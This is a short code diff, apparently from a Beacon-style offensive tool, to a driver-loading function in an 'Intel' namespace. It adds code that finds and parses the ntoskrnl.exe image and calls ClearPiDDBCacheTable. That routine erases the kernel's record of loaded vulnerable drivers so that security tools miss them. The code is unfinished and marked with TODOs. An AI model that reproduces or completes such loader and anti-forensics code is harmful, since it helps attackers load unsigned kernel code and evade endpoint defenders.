@@ -215,6 +215,7 @@ namespace Intel {
 
 	HANDLE DriverLoad(wchar_t *driver_name, uint8_t *driver, size_t size) {
 
+		EXECUTABLE *image = nullptr;
 		HANDLE handle = nullptr;
 		bool success = false;
 
@@ -255,7 +256,16 @@ namespace Intel {
 			goto defer;
 		}
 
-		ntoskrnl = GetKernelAddress("");
+		// TODO: string hash names
+		if (!(ntoskrnl = Beacon$FindKernelModule("ntoskrnl.exe")) ||
+			!(image = Beacon$CreateImageData((uint8_t*) ntoskrnl))) {
+			goto defer;
+		}
+
+		if (!ClearPiDDBCacheTable(handle)) {
+			goto defer;
+		}
+
 		// TODO: FINISH
 
 		success = true;
